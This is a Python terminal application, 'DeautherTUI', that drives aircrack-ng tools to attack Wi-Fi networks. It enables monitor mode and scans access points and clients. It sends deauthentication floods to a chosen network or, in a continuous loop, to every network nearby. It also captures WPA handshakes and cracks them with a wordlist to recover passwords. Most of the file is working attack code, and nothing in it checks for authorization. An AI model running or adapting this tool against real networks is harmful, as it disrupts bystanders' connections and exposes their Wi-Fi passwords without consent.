#!/usr/bin/env python3
import asyncio
import csv
import os
import signal
import subprocess
import sys
from datetime import datetime
from pathlib import Path

try:
    from textual.app import App, ComposeResult
    from textual.widgets import (
        Header, Footer, DataTable, Static,
        Button, Label, Input, Log
    )
    from textual.containers import Horizontal, Vertical, Container
    from textual.binding import Binding
    from textual import work
    from rich.text import Text
except ImportError:
    print(
        "Error: textual not found. "
        "Please run ./setup.sh or pip install textual rich pandas"
    )
    sys.exit(1)

# Constants
TMP_PATH = Path("/tmp/deauth_tui")
TMP_PATH.mkdir(exist_ok=True)
SCAN_FILE_PREFIX = TMP_PATH / "scan"

class DeautherTUI(App):
    """A premium WiFi Deauther TUI."""
    
    TITLE = "DeautherTUI"
    SUB_TITLE = "Advanced WiFi Security Auditor"
    CSS = """
    Screen {
        background: #121212;
    }

    #sidebar {
        width: 30;
        background: #1e1e1e;
        border-right: tall #333;
        padding: 1;
    }

    #main-content {
        padding: 1;
    }

    DataTable {
        height: 1fr;
        border: round #333;
        background: #1a1a1a;
    }

    Log {
        height: 10;
        border: round #333;
        background: #000;
        color: #0f0;
    }

    .status-bar {
        background: #222;
        color: #aaa;
        padding: 0 1;
    }

    .header-text {
        color: #00d7ff;
        text-style: bold;
    }

    Button {
        width: 100%;
        margin-top: 1;
    }

    #btn-start-scan {
        background: #005f00;
    }
    #btn-start-scan-5g {
        background: #004f8f;
    }
    #btn-start-scan-all {
        background: #5f5f00;
    }
    #btn-stop-scan {
        background: #5f0000;
    }
    """

    BINDINGS = [
        Binding("q", "quit", "Quit", show=True),
        Binding("ctrl+q", "quit", "Quit", show=False),
        Binding("s", "toggle_scan", "Start/Stop Scan", show=True),
        Binding("d", "attack_selected", "Deauth Target", show=True),
        Binding("r", "refresh_interfaces", "Refresh IFace", show=True),
    ]

    def __init__(self):
        super().__init__()
        self.interface = ""
        self.scanning = False
        self.scan_process = None
        self.targets = []
        self.selected_target = None
        self.is_demo = os.environ.get("DEAUTH_DEMO", "0") == "1"
        self.capture_process = None
        self.is_capturing = False
        self.handshake_found = False
        self.scan_band = "bg"
        self.is_deauthing_all = False

    def compose(self) -> ComposeResult:
        yield Header(show_clock=True)
        with Horizontal():
            with Vertical(id="sidebar"):
                yield Label("WIFI INTERFACE", classes="header-text")
                yield Label("Not Selected", id="lbl-interface")
                yield Label("Mode: Unknown", id="lbl-iface-mode")
                yield Button(
                    "Select Interface",
                    id="btn-select-iface",
                    variant="primary"
                )
                
                yield Label("\nCONTROLS", classes="header-text")
                yield Button("Start Scan (2.4GHz)", id="btn-start-scan")
                yield Button("Start Scan (5GHz)", id="btn-start-scan-5g")
                yield Button("Start Scan (All Bands)", id="btn-start-scan-all")
                yield Button("Stop Scan", id="btn-stop-scan", disabled=True)
                
                yield Label("\nTARGET INFO", classes="header-text")
                yield Label("BSSID: N/A", id="lbl-target-bssid")
                yield Label("SSID: N/A", id="lbl-target-ssid")
                yield Label("CHAN: N/A", id="lbl-target-chan")
                yield Label("HS: [RED]None[/RED]", id="lbl-handshake")
                
                yield Button(
                    "Deauth Target",
                    id="btn-deauth",
                    variant="error",
                    disabled=True
                )
                yield Button(
                    "Deauth All Targets",
                    id="btn-deauth-all",
                    variant="error",
                    disabled=False
                )
                yield Button(
                    "Capture Handshake",
                    id="btn-capture",
                    variant="warning",
                    disabled=True
                )
                
                yield Label("\nCRACKING", classes="header-text")
                yield Input(placeholder="Path to wordlist...", id="inp-wordlist")
                yield Button(
                    "Start Cracking",
                    id="btn-crack",
                    variant="success",
                    disabled=True
                )
            
            with Vertical(id="main-content"):
                yield Label("ACCESS POINTS", classes="header-text")
                yield DataTable(id="tbl-aps")
                yield Label("CLIENTS", classes="header-text")
                yield DataTable(id="tbl-clients")
                yield Label("ACTIVITY LOG", classes="header-text")
                yield Log(id="log-output")
        yield Footer()

    def on_mount(self) -> None:
        self.log_msg("DeautherTUI Started.")
        if self.is_demo:
            self.log_msg("[YELLOW]Running in DEMO mode.[/YELLOW]")
        
        table = self.query_one("#tbl-aps", DataTable)
        table.add_columns(
            "BSSID", "SSID", "CH", "PWR", "ENC", "CLIENTS"
        )
        table.cursor_type = "row"
        
        client_table = self.query_one("#tbl-clients", DataTable)
        client_table.add_columns("STATION", "BSSID", "PWR", "PACKETS")
        
        self.refresh_interfaces()

    def on_unmount(self) -> None:
        """Clean up and restart NetworkManager on exit."""
        if self.is_demo: return
        
        # Stop scanning
        self.scanning = False
        self.stop_scan_process()
        
        # Restore interface to managed mode
        if self.interface:
            try:
                subprocess.run(
                    ["ip", "link", "set", self.interface, "down"],
                    capture_output=True
                )
                subprocess.run(
                    ["iw", "dev", self.interface, "set", "type", "managed"],
                    capture_output=True
                )
                subprocess.run(
                    ["ip", "link", "set", self.interface, "up"],
                    capture_output=True
                )
            except:
                pass

        # Restart NetworkManager
        try:
            subprocess.run(
                ["systemctl", "restart", "NetworkManager"],
                capture_output=True
            )
        except:
            pass

    def log_msg(self, msg: str):
        log = self.query_one("#log-output", Log)
        timestamp = datetime.now().strftime("%H:%M:%S")
        log.write_line(f"[{timestamp}] {msg}")

    def refresh_interfaces(self):
        if self.is_demo:
            self.interface = "wlan0mon"
            self.query_one("#lbl-interface").update(
                f"[GREEN]{self.interface}[/GREEN]"
            )
            self.query_one("#lbl-iface-mode").update(
                "Mode: [GREEN]Monitor[/GREEN]"
            )
        else:
            try:
                result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
                interfaces = []
                current_iface = ""
                iface_modes = {}
                
                for line in result.stdout.splitlines():
                    if "Interface" in line:
                        current_iface = line.split()[1]
                        interfaces.append(current_iface)
                    if "type" in line and current_iface:
                        mode = line.split()[1]
                        iface_modes[current_iface] = mode
                
                if interfaces:
                    # Logic: 
                    # 1. If an interface is already selected and still exists, keep it.
                    # 2. BUT, if we just enabled monitor mode, we want the monitor one.
                    # 3. So, prioritize any interface with 'mon' or type 'monitor'.
                    
                    mon_ifaces = [
                        i for i in interfaces
                        if iface_modes.get(i) == "monitor"
                    ]
                    if mon_ifaces:
                        # If our current interface isn't monitor but a monitor one exists, switch!
                        if self.interface not in mon_ifaces:
                            self.interface = mon_ifaces[0]
                    elif self.interface not in interfaces:
                        self.interface = interfaces[0]
                    
                    mode = iface_modes.get(self.interface, "unknown")
                    self.query_one("#lbl-interface").update(
                        f"[CYAN]{self.interface}[/CYAN]"
                    )
                    mode_color = "GREEN" if mode == "monitor" else "YELLOW"
                    self.query_one("#lbl-iface-mode").update(
                        f"Mode: [{mode_color}]{mode}[/{mode_color}]"
                    )
                else:
                    self.interface = ""
                    self.query_one("#lbl-interface").update("[RED]No Interfaces[/RED]")
                    self.query_one("#lbl-iface-mode").update("Mode: N/A")
            except Exception as e:
                self.log_msg(f"Error listing interfaces: {e}")
                self.interface = "Error"
                self.query_one("#lbl-interface").update("[RED]Error[/RED]")

    async def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "btn-select-iface":
            self.cycle_interfaces()
        elif event.button.id == "btn-start-scan":
            self.scan_band = "bg"
            await self.action_toggle_scan()
        elif event.button.id == "btn-start-scan-5g":
            self.scan_band = "a"
            await self.action_toggle_scan()
        elif event.button.id == "btn-start-scan-all":
            self.scan_band = "abg"
            await self.action_toggle_scan()
        elif event.button.id == "btn-stop-scan":
            await self.action_toggle_scan()
        elif event.button.id == "btn-deauth":
            self.action_attack_selected()
        elif event.button.id == "btn-deauth-all":
            await self.action_toggle_deauth_all()
        elif event.button.id == "btn-capture":
            await self.action_toggle_capture()
        elif event.button.id == "btn-crack":
            self.action_crack()

    async def action_toggle_capture(self):
        if not self.selected_target: return
        
        if not self.is_capturing:
            self.is_capturing = True
            self.log_msg(
                f"[YELLOW]STARTING CAPTURE[/YELLOW] "
                f"on {self.selected_target['ssid']}..."
            )
            self.query_one("#btn-capture").label = "Stop Capture"
            self.start_capture_process()
        else:
            self.is_capturing = False
            self.query_one("#btn-capture").label = "Capture Handshake"
            self.log_msg("Stopping capture...")
            self.stop_capture_process()

    @work(exclusive=True)
    async def start_capture_process(self):
        if self.is_demo:
            await asyncio.sleep(5)
            self.handshake_found = True
            self.query_one("#lbl-handshake").update("HS: [GREEN]CAPTURED[/GREEN]")
            self.log_msg("[GREEN]DEMO: Handshake captured![/GREEN]")
            self.query_one("#btn-crack").disabled = False
            return

        # airodump-ng --bssid <BSSID> -c <CH> -w <file> <iface>
        bssid_clean = self.selected_target['bssid'].replace(':', '')
        cap_file = TMP_PATH / f"capture_{bssid_clean}"
        cmd = [
            "airodump-ng",
            "--bssid", self.selected_target['bssid'],
            "-c", self.selected_target['chan'],
            "-w", str(cap_file),
            self.interface
        ]
        
        try:
            self.capture_process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setsid
            )
            while self.is_capturing:
                # Check for handshake in the .cap file or via log parsing
                # (Airodump-ng updates the UI but we can check file size
                # or use aircrack-ng to verify)
                await asyncio.sleep(2)
                self.check_handshake(cap_file)
        except Exception as e:
            self.log_msg(f"Capture error: {e}")

    def check_handshake(self, cap_file_base):
        cap_file = Path(f"{cap_file_base}-01.cap")
        if not cap_file.exists(): return
        
        # Quick check using aircrack-ng to see if handshake is present
        try:
            res = subprocess.run(["aircrack-ng", str(cap_file)], capture_output=True, text=True)
            has_hs = (
                "1 handshake" in res.stdout
                or "WPA (1)" in res.stdout
            )
            if has_hs:
                self.handshake_found = True
                self.query_one("#lbl-handshake").update(
                    "HS: [GREEN]CAPTURED[/GREEN]"
                )
                self.log_msg("[GREEN]HANDSHAKE CAPTURED![/GREEN]")
                self.query_one("#btn-crack").disabled = False
        except:
            pass

    def stop_capture_process(self):
        if self.capture_process:
            try: os.killpg(os.getpgid(self.capture_process.pid), signal.SIGTERM)
            except: pass
            self.capture_process = None

    def action_crack(self):
        wordlist = self.query_one("#inp-wordlist").value
        if not wordlist or not os.path.exists(wordlist):
            self.log_msg("[RED]Error: Invalid wordlist path![/RED]")
            return
        
        bssid_clean = self.selected_target['bssid'].replace(':', '')
        cap_file = TMP_PATH / f"capture_{bssid_clean}-01.cap"
        self.log_msg(
            f"[CYAN]CRACKING[/CYAN] with {os.path.basename(wordlist)}..."
        )
        self.run_crack(str(cap_file), wordlist)

    @work(exclusive=True)
    async def run_crack(self, cap_file, wordlist):
        cmd = ["aircrack-ng", "-w", wordlist, cap_file]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            output = stdout.decode()
            if "KEY FOUND!" in output:
                key = (
                    output.split("KEY FOUND! [")[1].split("]")[0]
                )
                self.log_msg(f"[GREEN]SUCCESS! Password: {key}[/GREEN]")
                self.query_one("#log-output").write_line(
                    f"\n*** PASSWORD FOUND: {key} ***\n"
                )
            else:
                self.log_msg(
                    "[RED]Cracking failed: Key not in wordlist.[/RED]"
                )
        except Exception as e:
            self.log_msg(f"Crack error: {e}")

    def cycle_interfaces(self):
        if self.is_demo: return
        try:
            result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
            ifaces = []
            for line in result.stdout.splitlines():
                if "Interface" in line:
                    ifaces.append(line.split()[1])
            
            if not ifaces: return
            
            if self.interface in ifaces:
                idx = (ifaces.index(self.interface) + 1) % len(ifaces)
                self.interface = ifaces[idx]
            else:
                self.interface = ifaces[0]
            
            self.query_one("#lbl-interface").update(f"[CYAN]{self.interface}[/CYAN]")
            self.log_msg(f"Switched to interface: {self.interface}")
        except Exception as e:
            self.log_msg(f"Error cycling interfaces: {e}")

    async def action_toggle_scan(self):
        if not self.interface:
            self.log_msg("[RED]Error: No interface selected![/RED]")
            return

        if not self.scanning:
            # Kill interfering processes FIRST
            if not self.is_demo:
                self.log_msg("[YELLOW]Killing interfering processes...[/YELLOW]")
                subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
                await asyncio.sleep(1)

            # Check for monitor mode
            if not self.is_demo:
                try:
                    res = subprocess.run(
                        ["iw", "dev", self.interface, "info"],
                        capture_output=True,
                        text=True
                    )
                    if "type monitor" not in res.stdout:
                        self.log_msg(
                            f"[YELLOW]Enabling monitor mode on "
                            f"{self.interface}...[/YELLOW]"
                        )
                        # Try robust manual way
                        subprocess.run(
                            ["ip", "link", "set", self.interface, "down"],
                            capture_output=True
                        )
                        subprocess.run(
                            ["iw", "dev", self.interface,
                             "set", "type", "monitor"],
                            capture_output=True
                        )
                        subprocess.run(
                            ["ip", "link", "set", self.interface, "up"],
                            capture_output=True
                        )
                        
                        # Fallback to airmon-ng if that failed
                        res_check = subprocess.run(
                            ["iw", "dev", self.interface, "info"],
                            capture_output=True,
                            text=True
                        )
                        if "type monitor" not in res_check.stdout:
                            subprocess.run(
                                ["airmon-ng", "start", self.interface],
                                capture_output=True
                            )
                        
                        await asyncio.sleep(2)
                        self.refresh_interfaces()
                    
                    # Ensure it's UP
                    subprocess.run(
                        ["ip", "link", "set", self.interface, "up"],
                        capture_output=True
                    )
                except Exception as e:
                    self.log_msg(f"Monitor mode error: {e}")

            self.scanning = True
            self.query_one("#btn-start-scan").disabled = True
            self.query_one("#btn-start-scan-5g").disabled = True
            self.query_one("#btn-start-scan-all").disabled = True
            self.query_one("#btn-stop-scan").disabled = False
            self.log_msg(f"Starting scan ({self.scan_band}) on {self.interface}...")
            self.start_scan_process()
        else:
            self.scanning = False
            self.query_one("#btn-start-scan").disabled = False
            self.query_one("#btn-start-scan-5g").disabled = False
            self.query_one("#btn-start-scan-all").disabled = False
            self.query_one("#btn-stop-scan").disabled = True
            self.log_msg("Stopping scan...")
            self.stop_scan_process()

    @work(exclusive=True)
    async def start_scan_process(self):
        SCAN_DURATION = 5  # seconds per sweep

        if self.is_demo:
            while self.scanning:
                self.update_tables_demo()
                await asyncio.sleep(SCAN_DURATION)
        else:
            while self.scanning:
                try:
                    # Clean up old scan files before each sweep
                    for f in TMP_PATH.glob("scan*"):
                        try: f.unlink()
                        except: pass

                    # WORKAROUND FOR REALTEK CARDS
                    # Wake up PHY by setting channel appropriately before scan
                    if "a" in self.scan_band:
                        subprocess.run(
                            ["iw", "dev", self.interface, "set", "channel", "36"],
                            capture_output=True
                        )
                    else:
                        subprocess.run(
                            ["iw", "dev", self.interface, "set", "channel", "1"],
                            capture_output=True
                        )

                    cmd_args = [
                        "airodump-ng",
                        "--write", str(SCAN_FILE_PREFIX),
                        "--output-format", "csv",
                        "--band", self.scan_band,
                        self.interface
                    ]
                    
                    proc = await asyncio.create_subprocess_exec(
                        *cmd_args,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        preexec_fn=os.setsid
                    )

                    # Let it run for SCAN_DURATION seconds
                    await asyncio.sleep(SCAN_DURATION)

                    # Kill the sweep
                    try:
                        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                        await asyncio.wait_for(proc.wait(), timeout=2)
                    except Exception:
                        pass

                    # Check for launch failure (exited before we killed it)
                    if proc.returncode not in (None, -15, -2, 0, 143):
                        self.log_msg(f"[YELLOW]Band flag failed, attempting explicit channel fallback...[/YELLOW]")
                        
                        channels = "1,6,11"
                        if self.scan_band == "bg":
                            channels = "1,2,3,4,5,6,7,8,9,10,11,12,13"
                        elif self.scan_band == "a":
                            channels = "36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140,144,149,153,157,161,165"
                        elif self.scan_band == "abg":
                            channels = "1,6,11,36,40,44,48,52,56,60,64,149,153,157,161,165"
                            
                        cmd_args = [
                            "airodump-ng",
                            "--write", str(SCAN_FILE_PREFIX),
                            "--output-format", "csv",
                            "--channel", channels,
                            self.interface
                        ]
                        
                        proc = await asyncio.create_subprocess_exec(
                            *cmd_args,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            preexec_fn=os.setsid
                        )
                        
                        await asyncio.sleep(SCAN_DURATION)
                        
                        try:
                            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                            await asyncio.wait_for(proc.wait(), timeout=2)
                        except Exception:
                            pass

                        if proc.returncode not in (None, -15, -2, 0, 143):
                            _, stderr = await proc.communicate()
                            self.log_msg(
                                f"[RED]Airodump error: {stderr.decode()[:120]}[/RED]"
                            )
                            self.scanning = False
                            self.query_one("#btn-start-scan").disabled = False
                            self.query_one("#btn-start-scan-5g").disabled = False
                            self.query_one("#btn-start-scan-all").disabled = False
                            self.query_one("#btn-stop-scan").disabled = True
                            return

                    # Parse whatever airodump wrote
                    self.parse_scan_results()

                except Exception as e:
                    self.log_msg(f"Scan sweep error: {e}")
                    self.scanning = False

    def stop_scan_process(self):
        if self.scan_process:
            try:
                os.killpg(os.getpgid(self.scan_process.pid), signal.SIGTERM)
            except:
                pass
            self.scan_process = None
        # Clean up temp files
        for f in TMP_PATH.glob("scan*"):
            try: f.unlink()
            except: pass

    def parse_scan_results(self):
        csv_file = Path(f"{SCAN_FILE_PREFIX}-01.csv")
        if not csv_file.exists(): return

        try:
            with open(csv_file, "r") as f:
                content = f.read()
                if not content: return
                
                parts = content.split("\n\n")
                if len(parts) < 2: return
                
                # Section 1: Access Points
                ap_lines = [l for l in parts[0].strip().splitlines() if l.strip()]
                if len(ap_lines) < 2: return
                
                ap_reader = csv.DictReader(ap_lines)
                ap_table = self.query_one("#tbl-aps", DataTable)
                
                # We'll clear and refill for now to keep it simple, but we'll try to 
                # restore the selection if we can.
                selected_key = ap_table.cursor_row
                
                # Filter out empty or header rows that might be misparsed
                valid_rows = []
                for row in ap_reader:
                    bssid = row.get("BSSID", "").strip()
                    if not bssid or bssid == "BSSID": continue
                    
                    ssid = row.get(" ESSID", "").strip()
                    chan = row.get(" channel", "").strip()
                    pwr = row.get(" Power", "").strip()
                    enc = row.get(" Privacy", "").strip()
                    valid_rows.append((bssid, ssid, chan, pwr, enc, "0"))

                if valid_rows:
                    ap_table.clear()
                    for r in valid_rows:
                        ap_table.add_row(*r, key=r[0]) # Use BSSID as key
                    
                    if selected_key is not None:
                        try: ap_table.move_cursor(row=selected_key)
                        except: pass

                # Section 2: Clients
                client_lines = [l for l in parts[1].strip().splitlines() if l.strip()]
                if len(client_lines) < 2: return
                
                client_reader = csv.DictReader(client_lines)
                client_table = self.query_one("#tbl-clients", DataTable)
                client_table.clear()
                for row in client_reader:
                    station = row.get("Station MAC", "").strip()
                    if not station or station == "Station MAC": continue
                    
                    bssid = row.get(" BSSID", "").strip()
                    pwr = row.get(" Power", "").strip()
                    packets = row.get(" # packets", "").strip()
                    client_table.add_row(station, bssid, pwr, packets)

        except Exception as e:
            pass

    def update_tables_demo(self):
        table = self.query_one("#tbl-aps", DataTable)
        table.clear()
        # Mock data
        demo_aps = [
            ("AA:BB:CC:DD:EE:01", "CoffeeShop_WiFi", "1", "-45", "WPA2", "3"),
            ("AA:BB:CC:DD:EE:02", "Home_Network", "6", "-60", "WPA2", "1"),
            ("AA:BB:CC:DD:EE:03", "Office_Guest", "11", "-72", "WPA3", "0"),
        ]
        for ap in demo_aps:
            table.add_row(*ap)

    def on_data_table_row_selected(self, event: DataTable.RowSelected) -> None:
        if event.data_table.id == "tbl-aps":
            row = event.data_table.get_row(event.row_key)
            self.selected_target = {
                "bssid": row[0],
                "ssid": row[1],
                "chan": row[2]
            }
            self.query_one("#lbl-target-bssid").update(
                f"BSSID: {self.selected_target['bssid']}"
            )
            self.query_one("#lbl-target-ssid").update(
                f"SSID: {self.selected_target['ssid']}"
            )
            self.query_one("#lbl-target-chan").update(
                f"CHAN: {self.selected_target['chan']}"
            )
            self.query_one("#btn-deauth").disabled = False
            self.query_one("#btn-capture").disabled = False
            self.query_one("#lbl-handshake").update("HS: [RED]None[/RED]")
            self.handshake_found = False
            self.log_msg(
                f"Target selected: {self.selected_target['ssid']}"
            )

    def action_attack_selected(self):
        if not self.selected_target: return
        self.log_msg(
            f"[RED]LAUNCHING DEAUTH ATTACK[/RED] "
            f"on {self.selected_target['ssid']}..."
        )
        self.run_deauth()

    @work(exclusive=True)
    async def run_deauth(self):
        if self.is_demo:
            self.log_msg("[YELLOW]DEMO: Sending 50 deauth packets...[/YELLOW]")
            await asyncio.sleep(5)
            self.log_msg("[GREEN]DEMO: Attack complete.[/GREEN]")
        else:
            # Lock channel first for efficiency
            self.log_msg(
                f"[YELLOW]Locking channel "
                f"{self.selected_target['chan']}...[/YELLOW]"
            )
            subprocess.run(
                ["iw", "dev", self.interface,
                 "set", "channel", self.selected_target['chan']],
                capture_output=True
            )
            
            # aireplay-ng --deauth 0 -a <BSSID> <interface>
            cmd = [
                "aireplay-ng",
                "--deauth", "100",
                "-a", self.selected_target['bssid'],
                "--ignore-negative-one",
                self.interface
            ]
            try:
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                stdout, stderr = await proc.communicate()
                self.log_msg("Deauth complete. Check targets.")
            except Exception as e:
                self.log_msg(f"Error launching attack: {e}")

    async def action_toggle_deauth_all(self):
        if not self.is_deauthing_all:
            self.is_deauthing_all = True
            self.query_one("#btn-deauth-all").label = "Stop Deauth All"
            self.log_msg("[RED]STARTING MASS DEAUTH ON ALL TARGETS[/RED]")
            self.run_deauth_all()
        else:
            self.is_deauthing_all = False
            self.query_one("#btn-deauth-all").label = "Deauth All Targets"
            self.log_msg("Stopping mass deauth...")

    @work(exclusive=True)
    async def run_deauth_all(self):
        if self.is_demo:
            while self.is_deauthing_all:
                self.log_msg("[YELLOW]DEMO: Sending deauth to all APs...[/YELLOW]")
                await asyncio.sleep(2)
            return

        table = self.query_one("#tbl-aps", DataTable)
        while self.is_deauthing_all:
            # Safely get all rows
            try:
                rows = [table.get_row(key) for key in table.rows.keys()]
            except Exception:
                rows = []

            if not rows:
                self.log_msg("[YELLOW]No targets found for mass deauth. Waiting...[/YELLOW]")
                await asyncio.sleep(2)
                continue

            for row in rows:
                if not self.is_deauthing_all:
                    break
                bssid = row[0]
                ssid = row[1]
                chan = row[2]
                
                self.log_msg(f"[YELLOW]Mass Deauth: Locking channel {chan} for {ssid}...[/YELLOW]")
                subprocess.run(
                    ["iw", "dev", self.interface, "set", "channel", chan],
                    capture_output=True
                )
                
                cmd = [
                    "aireplay-ng",
                    "--deauth", "10",
                    "-a", bssid,
                    "--ignore-negative-one",
                    self.interface
                ]
                try:
                    proc = await asyncio.create_subprocess_exec(
                        *cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    await proc.communicate()
                except Exception as e:
                    self.log_msg(f"Mass Deauth error on {ssid}: {e}")
                
                await asyncio.sleep(0.5)

if __name__ == "__main__":
    app = DeautherTUI()
    app.run()
